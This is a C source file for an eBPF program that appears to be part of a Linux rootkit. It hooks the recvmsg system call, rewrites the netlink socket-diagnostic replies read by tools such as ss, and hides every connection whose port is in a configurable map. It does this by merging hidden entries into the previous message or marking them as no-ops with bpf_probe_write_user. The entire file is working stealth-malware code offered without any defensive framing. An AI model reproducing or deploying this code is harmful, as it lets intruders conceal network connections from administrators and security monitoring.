#include "vmlinux.h"
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_endian.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include "bpf/maps.h"

#ifndef SOCK_DIAG_BY_FAMILY
#define SOCK_DIAG_BY_FAMILY 20
#endif

#ifndef NLMSG_NOOP
#define NLMSG_NOOP 1
#endif

#define LOOP_BOUND 128

/* Track msghdr per thread between kprobe and kretprobe */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 10240);
    __type(key, u32); // tid
    __type(value, struct user_msghdr *);
} msg_ptr_map SEC(".maps");

struct scrub_context {
    char *base;        /* User buffer base address */
    u32 total_len;   /* Total buffer length from iov_len */
    u32 offset;      /* Current scan position */
    u32 prev_offset; /* Offset of the previous message */
    u8 has_prev;     /* Whether we've seen a previous message */
};

/* === Not in vmlinux.h so I have to define these manually === */
struct inet_diag_sockid {
    u16 idiag_sport;
    u16 idiag_dport;
    u32 idiag_src[4];
    u32 idiag_dst[4];
    u32 idiag_if;
    u32 idiag_cookie[2];
};

struct inet_diag_msg {
    u8 idiag_family;
    u8 idiag_state;
    u8 idiag_timer;
    u8 idiag_retrans;
    struct inet_diag_sockid id;
    u32 idiag_expires;
    u32 idiag_rqueue;
    u32 idiag_wqueue;
    u32 idiag_uid;
    u32 idiag_inode;
};
/* ======================== */

/**
 * @brief Loop callback.
 *
 * If the current message describes a socket whose port is in
 * hide_ports_map, the message is absorbed by extending the previous
 * message's nlmsg_len to cover it. If there is no previous message,
 * the message's type is rewritten to NLMSG_NOOP as a fallback.
 *
 * @param idx
 * @param data
 * @return long 0 - Continue the loop, 1 - Stop the loop
 */
static long scrub_one_msg(u32 idx, void *data) {
    (void)idx;
    struct scrub_context *scrub_ctx = data;

    if (scrub_ctx->offset + sizeof(struct nlmsghdr) > scrub_ctx->total_len)
        return 1;

    struct nlmsghdr nl_header;
    if (bpf_probe_read_user(&nl_header, sizeof(nl_header), scrub_ctx->base + scrub_ctx->offset) < 0)
        return 1;

    if (nl_header.nlmsg_len < sizeof(struct nlmsghdr))
        return 1;
    if (nl_header.nlmsg_len > scrub_ctx->total_len - scrub_ctx->offset)
        return 1;

    if (nl_header.nlmsg_type == SOCK_DIAG_BY_FAMILY) {
        struct inet_diag_msg diag;
        u32 diag_offset = scrub_ctx->offset + sizeof(struct nlmsghdr);

        if (diag_offset + sizeof(diag) <= scrub_ctx->total_len &&
            bpf_probe_read_user(&diag, sizeof(diag), scrub_ctx->base + diag_offset) >= 0) {

            u16 sport = bpf_ntohs(diag.id.idiag_sport);
            u16 dport = bpf_ntohs(diag.id.idiag_dport);
            u8 *hide_src = bpf_map_lookup_elem(&hide_ports_map, &sport);
            u8 *hide_dest = bpf_map_lookup_elem(&hide_ports_map, &dport);

            if ((hide_src && *hide_src == 1) || (hide_dest && *hide_dest == 1)) {
                /* If there's a previous message, I extend it's length over current message */
                if (scrub_ctx->has_prev) {
                    u32 prev_nlmsg_len;
                    void *prev_len_field = scrub_ctx->base + scrub_ctx->prev_offset;
                    if (bpf_probe_read_user(&prev_nlmsg_len, sizeof(prev_nlmsg_len),
                                            prev_len_field) >= 0) {
                        prev_nlmsg_len += nl_header.nlmsg_len;
                        bpf_probe_write_user(prev_len_field, &prev_nlmsg_len, sizeof(prev_nlmsg_len));
                    }
                    /* Hidden entry absorbed into prev — don't update prev_offset */
                    /* If a subsequent hidden entry shows up,
                    it should be absorbedinto the same previous message */
                    scrub_ctx->offset += nl_header.nlmsg_len;
                    return 0;
                }
                /* First message can't be absorbed, mark as NOOP */
                u16 noop = NLMSG_NOOP;
                void *type_field =
                    scrub_ctx->base + scrub_ctx->offset + offsetof(struct nlmsghdr, nlmsg_type);
                bpf_probe_write_user(type_field, &noop, sizeof(noop));
            }
        }
    }

    scrub_ctx->prev_offset = scrub_ctx->offset;
    scrub_ctx->has_prev = 1;
    scrub_ctx->offset += nl_header.nlmsg_len;

    return 0;
}

/**
 * @brief Hook on recvmsg to read user_msghdr and stash it for exit.
 *
 */
SEC("kprobe/__x64_sys_recvmsg")
int BPF_KSYSCALL(capture_recvmsg, int sockfd, struct user_msghdr *msg) {
    u32 tid = bpf_get_current_pid_tgid();

    if (msg)
        bpf_map_update_elem(&msg_ptr_map, &tid, &msg, BPF_ANY);

    return 0;
}

/**
 * @brief Hook on recvmsg to read stashed user_msghdr and scrub all netlink
 * messages.
 *
 * Using kretprobe and not fexit since fexit can't call bpf_probe_write_user.
 *
 */
SEC("kretprobe/__x64_sys_recvmsg")
int BPF_KRETPROBE(scrub_recvmsg, long ret) {
    u32 tid = bpf_get_current_pid_tgid();
    struct user_msghdr **msgp;
    struct user_msghdr msg;
    struct iovec iov;

    if (ret <= 0)
        goto out;

    msgp = bpf_map_lookup_elem(&msg_ptr_map, &tid);
    if (!msgp)
        goto out;

    if (bpf_probe_read_user(&msg, sizeof(msg), *msgp) < 0)
        goto out;

    if (!msg.msg_iov || msg.msg_iovlen == 0)
        goto out;

    if (bpf_probe_read_user(&iov, sizeof(iov), msg.msg_iov) < 0)
        goto out;

    if (!iov.iov_base || iov.iov_len < sizeof(struct nlmsghdr))
        goto out;

    struct scrub_context scrub_ctx = {
        .base = (char *)iov.iov_base,
        .total_len = iov.iov_len,
        .offset = 0,
        .prev_offset = 0,
        .has_prev = 0,
    };

    bpf_loop(LOOP_BOUND, scrub_one_msg, &scrub_ctx, 0);

out:
    bpf_map_delete_elem(&msg_ptr_map, &tid);
    return 0;
}
